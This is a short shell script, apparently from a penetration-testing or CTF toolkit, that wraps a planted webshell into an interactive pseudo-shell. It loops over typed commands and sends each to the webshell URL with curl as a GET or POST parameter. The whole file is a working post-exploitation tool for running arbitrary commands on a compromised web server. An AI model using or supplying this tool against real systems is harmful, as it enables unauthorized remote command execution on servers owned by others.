#!/bin/sh

# creates a pseudoshell from a webshell url (method and paramname needed)

if [ $# -lt 3 ]; then
    echo "ERR: Not enough parguments provided!"
    echo "usage: sh $0 <METHOD> <URL> <PARAMNAME>"
    echo "example: sh $0 \"POST\" \"http://10.10.69.211/exploit.php\" \"cmd\""
    exit 1
fi

METHOD=$1
URL=$2
PARAMNAME=$3

while IFS= read -r CMD;
do
    [ "${METHOD}" = "POST" ] && curl -s "${URL}" --data-urlencode "${PARAMNAME}=${CMD}"
    [ "${METHOD}" = "GET" ] && curl -s "${URL}" --get --data-urlencode "${PARAMNAME}=${CMD}"
done
